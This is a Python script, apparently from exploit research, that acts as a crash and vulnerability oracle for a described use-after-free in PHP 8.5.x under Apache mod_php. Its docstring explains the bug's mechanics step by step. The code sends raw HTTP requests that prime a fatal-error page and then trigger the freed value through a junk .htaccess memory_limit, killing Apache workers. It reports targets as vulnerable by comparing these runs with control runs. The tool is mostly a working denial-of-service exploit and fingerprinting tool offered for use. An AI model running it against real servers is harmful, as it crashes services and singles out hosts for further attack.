#!/usr/bin/env python3
# INDEX: fatal-backtrace UAF crash-signature oracle | apache | pristine child required
"""EG(last_fatal_error_backtrace) UAF -- crash / vuln-signature ORACLE.

  This is a crash (DoS) + vuln-signature oracle, not a write/RCE primitive.
  The stale-zval dtor corrupts the request heap and the worker dies (SIGSEGV, or
  SIGABRT via the ZEND_MM heap-integrity check -> "zend_mm_heap corrupted"). The
  signal is differential worker death; turning the UAF into a controlled
  write/leak is not done here. Use it to fingerprint a target as fbt-vulnerable.

Primitive (Bhavye-Malhotra), 8.5.x mod_php / Apache ONLY:
  (1) An E_USER_ERROR (in E_FATAL_ERRORS) with fatal_error_backtraces=On captures
      a backtrace into EG(last_fatal_error_backtrace) on the request heap
      (Zend/zend.c zend_error_zstr_at).
  (2) zend_shutdown_executor_values() dtors+UNDEFs that zval ONLY inside
      `if (!fast_shutdown)`. A normal request takes fast_shutdown, so on a
      VULNERABLE build the zval survives RSHUTDOWN as a DANGLING pointer into the
      bulk-freed request heap. Fixed builds (>= 8.5.12) add an unconditional
      ZVAL_UNDEF(&EG(last_fatal_error_backtrace)) after the if/else -> no dangle.
  (3) Next request on the SAME child: mod_php applies per-dir INI at
      PHP_INI_STAGE_HTACCESS BEFORE request startup (sapi/apache2handler). An
      invalid `php_value memory_limit <junk>` makes OnUpdateMemoryConsumption emit
      zend_error(E_WARNING); zend_error_zstr_at ALWAYS does
      `zval_ptr_dtor(&EG(last_fatal_error_backtrace))` first -> dtor on the stale
      freed zval -> UAF, BEFORE init_executor would have UNDEF'd it.

Preconditions:
  * 8.5.x (feature absent on 8.4.27; fixed >= 8.5.12). mod_php/Apache only
    (php -S / php-fpm have no pre-request-init per-dir INI stage).
  * Attacker controls .htaccess / per-dir config (AllowOverride must permit
    php_value) so the junk memory_limit lands at HTACCESS stage.
  * PRISTINE child: fatal.php must be the FIRST request that child serves. A
    warmed child gives silent corruption instead of a clean worker kill.

Detection is DIFFERENTIAL:
  ATTACK   = prime fatal.php (pristine child) -> request junk-INI dir page.
  CONTROL  = (a) junk-INI dir page WITHOUT the fatal prime, and
             (b) fatal prime -> clean-INI dir page.
  Vulnerable iff the ATTACK kills the worker but neither CONTROL does.

HTTP-only, pure stdlib, safe under `python3 -I`.

Usage:
    python3 -I verify_fatal_backtrace_oracle.py ... (or run this module directly)
    python3 -I fatal_backtrace_oracle.py http://127.0.0.1:8104
    python3 -I fatal_backtrace_oracle.py http://127.0.0.1:8104 --trials 4 \
        --reset-cmd "docker restart php2shell-fbt-8104"

--reset-cmd (optional) runs before each trial to force a pristine child (e.g. a
container restart). Without it the oracle relies on crash-respawn to supply a
fresh child between ATTACK trials and warns the first trial may hit a warmed one.
"""
from __future__ import annotations

import argparse
import socket
import subprocess
import sys
import time
from urllib.parse import urlsplit

# Lab endpoint layout (lab/fbt/). Override with --fatal/--junk/--clean if the
# target uses different paths.
DEF_FATAL = "/fatal.php"       # arms EG(last_fatal_error_backtrace)
DEF_JUNK = "/junkdir/probe.php"   # dir whose .htaccess has junk php_value memory_limit
DEF_CLEAN = "/cleandir/probe.php"  # dir whose .htaccess has a VALID php_value


class HttpResult:
    __slots__ = ("crashed", "status", "nbytes", "detail")

    def __init__(self, crashed: bool, status: int | None, nbytes: int, detail: str):
        self.crashed = crashed
        self.status = status
        self.nbytes = nbytes
        self.detail = detail

    def __repr__(self) -> str:
        s = f"status={self.status}" if self.status is not None else "status=-"
        return f"<{'CRASH' if self.crashed else 'alive'} {s} bytes={self.nbytes} {self.detail}>"


def _get(host: str, port: int, path: str, timeout: float = 10.0) -> HttpResult:
    """One GET over a raw socket. A worker death mid-response shows up as a
    connection reset / empty reply / truncated read -> crashed=True. A clean
    HTTP response (any status with a complete read) -> crashed=False."""
    req = (
        f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
        "User-Agent: fbt-oracle\r\nConnection: close\r\nAccept: */*\r\n\r\n"
    ).encode()
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.settimeout(timeout)
            s.sendall(req)
            buf = bytearray()
            while True:
                try:
                    chunk = s.recv(65536)
                except socket.timeout:
                    # Hung mid-response: treat as a crash signal, but flag it.
                    return HttpResult(True, None, len(buf), "recv-timeout(hang)")
                if not chunk:
                    break
                buf.extend(chunk)
    except (ConnectionResetError, BrokenPipeError) as e:
        return HttpResult(True, None, 0, f"conn-reset:{type(e).__name__}")
    except OSError as e:
        return HttpResult(True, None, 0, f"conn-error:{type(e).__name__}:{e}")

    if not buf:
        return HttpResult(True, None, 0, "empty-reply")
    # Parse the status line; a complete HTTP response means the worker lived.
    status = None
    first = bytes(buf[: buf.find(b"\r\n")]) if b"\r\n" in buf else bytes(buf)
    parts = first.split(b" ", 2)
    if len(parts) >= 2 and parts[0].startswith(b"HTTP/"):
        try:
            status = int(parts[1])
        except ValueError:
            status = None
    body_off = buf.find(b"\r\n\r\n")
    nbody = len(buf) - (body_off + 4) if body_off != -1 else len(buf)
    if status is None:
        # Got bytes but no valid status line -> garbage from a dying worker.
        return HttpResult(True, None, len(buf), "no-status-line")
    return HttpResult(False, status, nbody, "ok")


def _reset(reset_cmd: str | None, base_host: str, port: int, settle: float) -> None:
    """Force a pristine child (optional) and wait until the server answers."""
    if reset_cmd:
        subprocess.run(reset_cmd, shell=True, check=False,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # Poll readiness without warming the eventual target child: a readiness probe
    # DOES warm whatever child answers it, so after it we must NOT reuse that
    # child for the attack. With MaxRequestWorkers 1 + crash-respawn the attack's
    # own crash later yields a fresh child; here we only wait for liveness.
    deadline = time.time() + max(settle, 1.0) + 15.0
    while time.time() < deadline:
        r = _get(base_host, port, "/index.php", timeout=3.0)
        if not r.crashed and r.status is not None:
            return
        time.sleep(0.3)


def run_attack(host: str, port: int, fatal: str, junk: str,
               inter: float) -> tuple[bool, str]:
    """Prime fatal.php (must be the first request on a pristine child) then hit
    the junk-INI dir. Returns (worker_killed, detail)."""
    a = _get(host, port, fatal)
    if a.crashed:
        return False, f"prime-request-itself-failed ({a.detail}); inconclusive"
    time.sleep(inter)
    b = _get(host, port, junk)
    return b.crashed, f"prime={a!r} trigger={b!r}"


def run_control_noprime(host: str, port: int, junk: str) -> tuple[bool, str]:
    """Junk-INI dir page WITHOUT priming -> warning fires but no stale zval."""
    b = _get(host, port, junk)
    return b.crashed, f"trigger={b!r}"


def run_control_clean(host: str, port: int, fatal: str, clean: str,
                      inter: float) -> tuple[bool, str]:
    """Prime fatal.php then hit a CLEAN-INI dir -> no E_WARNING -> no dtor."""
    a = _get(host, port, fatal)
    if a.crashed:
        return False, f"prime-request-itself-failed ({a.detail})"
    time.sleep(inter)
    b = _get(host, port, clean)
    return b.crashed, f"prime={a!r} trigger={b!r}"


def probe_target(base_url: str, trials: int = 4, reset_cmd: str | None = None,
                 fatal: str = DEF_FATAL, junk: str = DEF_JUNK,
                 clean: str = DEF_CLEAN, inter: float = 0.3,
                 settle: float = 2.0, verbose: bool = True) -> dict:
    u = urlsplit(base_url)
    if u.scheme not in ("http", ""):
        raise SystemExit(f"only http:// targets supported, got {u.scheme!r}")
    host = u.hostname or "127.0.0.1"
    port = u.port or 80

    def log(msg: str) -> None:
        if verbose:
            print(msg, flush=True)

    results = {"attack_kills": 0, "ctrl_noprime_kills": 0,
               "ctrl_clean_kills": 0, "trials": trials, "details": []}

    for i in range(trials):
        _reset(reset_cmd, host, port, settle)
        killed, detail = run_attack(host, port, fatal, junk, inter)
        results["attack_kills"] += int(killed)
        results["details"].append(("attack", i, killed, detail))
        log(f"[attack  {i+1}/{trials}] worker_killed={killed}  {detail}")

    for i in range(trials):
        _reset(reset_cmd, host, port, settle)
        killed, detail = run_control_noprime(host, port, junk)
        results["ctrl_noprime_kills"] += int(killed)
        results["details"].append(("ctrl_noprime", i, killed, detail))
        log(f"[ctrl-np {i+1}/{trials}] worker_killed={killed}  {detail}")

    for i in range(trials):
        _reset(reset_cmd, host, port, settle)
        killed, detail = run_control_clean(host, port, fatal, clean, inter)
        results["ctrl_clean_kills"] += int(killed)
        results["details"].append(("ctrl_clean", i, killed, detail))
        log(f"[ctrl-cl {i+1}/{trials}] worker_killed={killed}  {detail}")

    ctrl_kills = results["ctrl_noprime_kills"] + results["ctrl_clean_kills"]
    results["vulnerable"] = (results["attack_kills"] >= 1 and ctrl_kills == 0)
    results["clean_signal"] = (results["attack_kills"] == trials and ctrl_kills == 0)
    return results


def main(argv: list[str]) -> int:
    ap = argparse.ArgumentParser(
        description="fbt EG(last_fatal_error_backtrace) UAF crash/vuln-signature oracle "
                    "(DoS + fingerprint only; NOT a write/RCE primitive).")
    ap.add_argument("url", help="base URL of the mod_php target, e.g. http://127.0.0.1:8104")
    ap.add_argument("--trials", type=int, default=4)
    ap.add_argument("--reset-cmd", default=None,
                    help="shell command run before each trial to force a pristine child "
                         "(e.g. 'docker restart php2shell-fbt-8104')")
    ap.add_argument("--fatal", default=DEF_FATAL)
    ap.add_argument("--junk", default=DEF_JUNK)
    ap.add_argument("--clean", default=DEF_CLEAN)
    ap.add_argument("--inter", type=float, default=0.3,
                    help="pause between the prime and the trigger request")
    ap.add_argument("--settle", type=float, default=2.0,
                    help="min seconds to wait for liveness after a reset")
    args = ap.parse_args(argv)

    if not args.reset_cmd:
        print("[!] no --reset-cmd: relying on crash-respawn for pristine children; "
              "the FIRST attack trial may hit a warmed child.", flush=True)

    r = probe_target(args.url, trials=args.trials, reset_cmd=args.reset_cmd,
                     fatal=args.fatal, junk=args.junk, clean=args.clean,
                     inter=args.inter, settle=args.settle)

    print("\n==== fbt UAF oracle verdict ====", flush=True)
    print(f"  attack worker-kills        : {r['attack_kills']}/{r['trials']}")
    print(f"  control(no-prime) kills    : {r['ctrl_noprime_kills']}/{r['trials']}")
    print(f"  control(clean-INI) kills   : {r['ctrl_clean_kills']}/{r['trials']}")
    if r["vulnerable"]:
        tag = "VULNERABLE-8.5-apache (fbt UAF reproduces)"
        if not r["clean_signal"]:
            tag += "  [partial: not all attack trials crashed -- warmed children?]"
        print(f"  => {tag}")
        print("  NOTE: crash/DoS + vuln signature only; write/RCE is UNPROVEN.")
        return 0
    print("  => NOT vulnerable (no differential worker kill) -- patched (>=8.5.12), "
          "non-8.5, non-mod_php, or precondition unmet.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
